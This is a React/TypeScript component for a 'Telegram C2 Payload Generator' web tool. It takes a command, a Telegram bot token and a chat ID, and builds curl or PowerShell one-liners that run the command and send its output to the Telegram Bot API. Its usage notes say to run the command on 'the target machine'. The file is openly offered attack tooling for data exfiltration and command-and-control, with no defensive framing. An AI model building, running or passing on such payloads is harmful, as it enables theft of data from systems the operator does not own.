
'use client';

import { useState } from 'react';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Loader2, Terminal, Sparkles, Clipboard, Info } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { Textarea } from '@/components/ui/textarea';
import { Label } from '@/components/ui/label';

const formSchema = z.object({
  payloadType: z.string().min(1, { message: 'Please select a payload type.' }),
  botToken: z.string().min(20, 'Please enter a valid Bot Token.'),
  chatId: z.string().min(1, 'Please enter a Chat ID.'),
  command: z.string().min(1, 'Please enter a command to run.'),
});

const payloadTypes = [
  'Bash (curl)',
  'PowerShell (Invoke-RestMethod)',
];

const generatePayload = (type: string, token: string, chatId: string, command: string) => {
    const encodedCommand = `$( ${command} )`;
    const messageText = `PAYLOAD_DELIVERED:%0A%0A\`\`\`%0A${encodedCommand}%0A\`\`\``;
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${messageText}&parse_mode=MarkdownV2`;

    switch(type) {
        case 'Bash (curl)':
            return `curl -s -X POST "${url}"`;
        case 'PowerShell (Invoke-RestMethod)':
            return `Invoke-RestMethod -Uri "${url}" -Method Post`;
        default:
            return 'Invalid payload type selected.';
    }
}


export function PayloadGenerator() {
  const [result, setResult] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      payloadType: 'Bash (curl)',
      botToken: '',
      chatId: '',
      command: 'whoami && id && pwd',
    },
  });

  function onSubmit(values: z.infer<typeof formSchema>) {
    setIsLoading(true);
    setResult(null);
    const payload = generatePayload(values.payloadType, values.botToken, values.chatId, values.command);
    setResult(payload);
    setIsLoading(false);
  }

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: 'Copied!',
      description: 'Payload copied to clipboard.',
    });
  };

  return (
    <Card>
      <CardHeader>
        <div className="flex items-center gap-3">
            <Terminal className="h-6 w-6" />
            <CardTitle>Telegram C2 Payload Generator</CardTitle>
        </div>
        <CardDescription>Generate one-liner payloads that exfiltrate command output to a Telegram chat.</CardDescription>
      </CardHeader>
      <CardContent>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
            <div className="grid md:grid-cols-2 gap-4">
               <FormField
                control={form.control}
                name="payloadType"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Payload Type</FormLabel>
                    <Select onValueChange={field.onChange} defaultValue={field.value}>
                      <FormControl><SelectTrigger><SelectValue /></SelectTrigger></FormControl>
                      <SelectContent>
                        {payloadTypes.map((type) => (<SelectItem key={type} value={type}>{type}</SelectItem>))}
                      </SelectContent>
                    </Select>
                    <FormMessage />
                  </FormItem>
                )}
              />
                <FormField
                control={form.control}
                name="command"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Command to Execute</FormLabel>
                    <FormControl><Input placeholder="e.g., whoami" {...field} /></FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
            </div>
             <div className="grid md:grid-cols-2 gap-4">
                <FormField
                    control={form.control}
                    name="botToken"
                    render={({ field }) => (
                    <FormItem>
                        <FormLabel>Your Telegram Bot Token</FormLabel>
                        <FormControl><Input placeholder="From @BotFather" {...field} /></FormControl>
                        <FormMessage />
                    </FormItem>
                    )}
                />
                <FormField
                    control={form.control}
                    name="chatId"
                    render={({ field }) => (
                    <FormItem>
                        <FormLabel>Your Chat ID</FormLabel>
                        <FormControl><Input placeholder="From @userinfobot" {...field} /></FormControl>
                        <FormMessage />
                    </FormItem>
                    )}
                />
            </div>
            <Button type="submit" disabled={isLoading} className="w-full md:w-auto">
              {isLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Sparkles className="mr-2 h-4 w-4" />}
              Generate Payload
            </Button>
          </form>
        </Form>
      </CardContent>
      
      {result && (
        <CardFooter className="flex-col items-start gap-4 border-t pt-6">
            <div>
              <Label>Generated Payload</Label>
              <div className="flex w-full items-center gap-2 mt-1">
                  <Textarea readOnly value={result} className="font-mono bg-primary/20" rows={4}/>
                  <Button type="button" size="icon" variant="outline" onClick={() => handleCopy(result)}>
                    <Clipboard className="h-4 w-4" />
                  </Button>
                </div>
            </div>
             <Card className="w-full bg-primary/20 border-accent/30">
                <CardHeader className="flex-row items-center gap-2 space-y-0 p-3">
                    <Info className="h-4 w-4 text-accent" />
                    <CardTitle className="text-base">Usage Notes</CardTitle>
                </CardHeader>
                <CardContent className="p-3 pt-0">
                    <p className="text-sm text-muted-foreground">Run this command on the target machine. The output of the embedded command will be sent to your specified Telegram chat.</p>
                </CardContent>
            </Card>
        </CardFooter>
      )}
    </Card>
  );
}
